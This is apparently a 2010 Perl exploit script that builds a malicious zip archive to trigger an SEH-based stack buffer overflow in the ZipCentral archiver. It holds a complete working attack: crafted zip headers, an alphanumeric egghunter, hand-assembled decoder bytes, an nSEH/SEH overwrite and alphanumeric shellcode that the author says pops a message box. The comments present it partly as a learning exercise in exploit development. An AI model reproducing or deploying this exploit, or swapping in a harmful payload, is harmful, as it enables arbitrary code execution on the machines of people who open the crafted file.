# Author : Jiten Pathy
# July 21 2010
 
 
#Thanks to the http://en.wikipedia.org/wiki/PKZIP page for heelping me understand zip file format
#Thanks to corelanc0d3r for shredding light on these type of exploits at http://www.offensive-security.com/vulndev/quickzip-stack-bof-0day-a-box-of-chocolates/
# Greetz to SSTeam and G4H members
 
#There is already a exploit on zipcentral filename handling buffer #overflow over 2 months ago which uses an address from a system dll for #SEH which isnt reliable across different platforms so this one uses an #address from exe file which is a little complicated but reliable
 
my $filename="pwnzipcentral.zip";
 
my $ldf_header = "\x50\x4B\x03\x04\x14\x00\x00".
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00" .
"\xe4\x0f" .# file size
"\x00\x00\x00";
 
my $cdf_header = "\x50\x4B\x01\x02\x14\x00\x14".
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\xe4\x0f". # file size
"\x00\x00\x00\x00\x00\x00\x01\x00".
"\x24\x00\x00\x00\x00\x00\x00\x00";
 
my $eofcdf_header = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00".
"\x12\x10\x00\x00". # Size of central directory (bytes)
"\x02\x10\x00\x00". # Offset of start of central directory,
                    # relative to start of archive
"\x00\x00";
 
my $egghunter="hffffk4diFkDrj02Drk0D2AuEE2C4s4I8K1L0v7K0R0I0i4A7N0J022q0D5M".
"4H7n100Y1p3Z8M3q0E305o0G3E4N3G0D";
#ascii mixed case egghunter with EDX as basereg
 
my $junk="A"x(653-length($egghunter)-102);
 
#Here is a different approach prior to make EDX to point at our #egghunter.
#push ebp,pop edx puts ebp into edx and then we add edx with right value.
#Here We encode
#add edx,087f
#jmp edx ;with custom decoder (muts) which should evntually execute these #two instructions which should be produced in stack after the decoder.SO #we need to prepare esp for this .But i found that instruction "pop esp"('\') breaks the shellcode (not so lucky for this application).
#So we cant just pop things from top of stack to point esp and we cant use #too many "popa" or "pop r" here due to limited space.
#So what we do here is inc esp using loop which will make esp point #somewhere after the decoder .So i did some lulz math found out how much #increment i need(0xb16) and did 2 loops(in hex 42*2b=b16;both are #alphanumeric) and we get the desired value in esp.There is always way to #make our way theough.
 
my $preparegg="\x6a\x42". #push 42h
"\x58".                    #pop eax
"\x6a\x2b".                #push 2bh
"\x59".                   #pop ecx
"C"x5 .                   #fillers for our loop Here is where inner loop #will jump
"\x44".                   #inc esp
"\x48".                   #dec eax
"\x75\xf6".               #converted \x75\xf7 not much difference lol #which is jnz -9
"\x34\x42".               #xor al,42
"\x49".                   #dec ecx
"\x75\xf6".               #again jnz -9 but this one will jump somewher in
#the fillers but all we care is about inc esp getting executed
"\x55".                   #push ebp
"\x5a".                   #pop edx
"\x25\x4A\x4D\x4E\x4a".  
"\x25\x35\x32\x31\x35".   #zero eax
"\x2d\x52\x55\x62\x43".
"\x2d\x52\x55\x66\x44".
"\x2d\x54\x56\x54\x36".   #\x08\xff\xe2\x41
"\x50".
"\x25\x4A\x4D\x4E\x4a".  
"\x25\x35\x32\x31\x35".   #zero eax
"\x2d\x33\x2b\x69\x2e".
"\x2d\x33\x2b\x69\x28".
"\x2d\x34\x28\x6b\x29".   #\x66\x81\xc2\x7f
"\x50";
 
my $fill="A"x(102-length($preparegg));#more nops
 
my $nseh="\x74\xf7\x41\x41";#becomes 74 98 41 41 jumping 102 bytes back
 
my $seh="\x41\x6c\x42\x00";#ascii compatible ppr address
 
#alpha mixedcase messagebox shellcode with EDI as basereg(since egghunter #has already EDI as address of our shellcode )
my $shell="hffffk4diFkDwj02Dwk0D7AuEE4n0b7n1132165L5m403i7l003d8K4G1p5k0l3c".
"0S3r0X0P018M4x191p0J3Y8L0t0P044S5K2A2G2J3C1N4x0F4x0Y8N3J0l2u2p353o4G8N3".
"V2j2D2t0n0F4p4s2q2t0u8K0a3r0R5O0G1N3P0o1m035L4y0V300B3Z3W0h1l7p2G3g3i3d".
"363G4q8L2n114l0V3n0r1p4x0u7o3t0t1k4s7n2s3u2J4B5O5K8M4K4q4T4A5K068o1p0z4".
"y0A5K4D3I4P3W4t8O3z0K0z0V2Z2Z004p032u0O0L08022l365K3H0D3Z4s8K403z001k7m".
"0O3R0G1N022H0X4T4T4J1p4X0P4x8L4X1P7k1k181o0I0L2A4u157L0N0M2q0Y12160B0T7".
"n0F7M0U100e4O1P1l2D7M0X2w0r2k4p102u0h0K7K0V190W011k080W090G2v0e4p0a0o2x".
"1L3m2C1k190K2K0R3X0y0o021n0Y180T2r0X070Q2j0C3X8P2C1k031p065L7L2w0T1l2C0".
"Q2A0W2r2p121n0Z0X051m7n0W020X0U0X7L0X0V0W0U0c2G1l0l0v0J0X2r1L2y1o1n1l09".
"1p7l0X190J0z0r3j3K2z0a0c0b4E3p0X0T2x0D2r4p7k2w0Q0O2O0a7l1o0Q0Z2m0H011p1".
"00c4k1P0n0Q0A3m198O5p04"; 
 
my $payload=$egghunter.$junk.$preparegg.$fill.$nseh.$seh."w00tw00t".$shell;
 
my $more="D" x (4064-length($payload));
 
$payload = $payload.$more.".txt";
 
print "Size : " . length($payload)."\n";
print "Removing old $filename file\n";
system("del $filename");
print "Creating new $filename file\n";
open(FILE, ">$filename");
print FILE $ldf_header.$payload.$cdf_header.$payload.$eofcdf_header;
close(FILE);
print "\m/ Your exploit is ready.\n";
#That popped a messagebox with message "My First Null free Shellcode In Windows"(indeed it was).All you need is a bit of quick math and keep looking for possibilities.
#Hope someone learned something from this re-exploit.